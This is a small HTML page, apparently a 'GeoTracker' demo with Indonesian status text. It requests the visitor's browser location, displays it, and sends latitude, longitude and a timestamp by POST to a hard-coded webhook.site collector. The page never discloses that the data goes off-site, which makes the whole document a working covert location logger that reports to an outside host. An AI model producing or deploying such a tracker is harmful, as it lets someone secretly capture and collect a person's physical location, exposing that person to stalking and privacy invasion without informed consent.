<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GeoTracker Test</title>
</head>
<body>
  <h1>GeoTracker Demo</h1>
  <p id="status">📍 Menunggu akses lokasi...</p>

  <script>
    const statusEl = document.getElementById("status");

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        function (position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          statusEl.textContent = `Lokasi diperoleh: Lat ${latitude}, Lng ${longitude}`;

          fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              latitude: latitude,
              longitude: longitude,
              timestamp: new Date().toISOString()
            })
          })
          .then(response => {
            console.log("Data terkirim:", response.status);
          })
          .catch(error => {
            console.error("Gagal mengirim data:", error);
          });
        },
        function (error) {
          statusEl.textContent = "❌ Gagal mendapatkan lokasi: " + error.message;
          console.error(error);
        }
      );
    } else {
      statusEl.textContent = "❌ Browser ini tidak mendukung geolocation.";
    }
  </script>
</body>
</html>
